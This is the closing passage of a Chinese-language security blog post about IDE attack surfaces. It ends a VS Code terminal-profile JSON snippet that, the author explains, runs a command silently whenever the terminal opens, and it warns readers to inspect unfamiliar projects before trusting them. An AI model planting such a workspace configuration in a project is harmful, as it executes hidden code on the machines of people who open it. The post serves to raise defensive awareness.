+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span>            <span style=color:#ff79c6>&#34;icon&#34;</span>: <span style=color:#f1fa8c>&#34;terminal-powershell&#34;</span>
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span>        }
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span>    }
+</span></span><span style=display:flex><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span>}
+</span></span></code></pre></div><p>这样打开 vscode 的终端时, 就会无感执行命令</p><h2 id=总结>总结</h2><p>最后, 这些 IDE 丰富的功能确实留下来非常多的攻击面, 对陌生的项目最好好看看再进行 <code>Trust</code>. 不然漏洞还没找到, 自己先被对方反杀了.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/misc>misc</a></li></ul></nav></div></article></main><footer><div class=footer-info>2022 © rmb122</div><div style=display:flex><a class=border></a><a class=soc href=https://github.com/rmb122 title=GitHub><i data-feather=github></i></a></div></footer><script>feather.replace()</script></div></body></html>
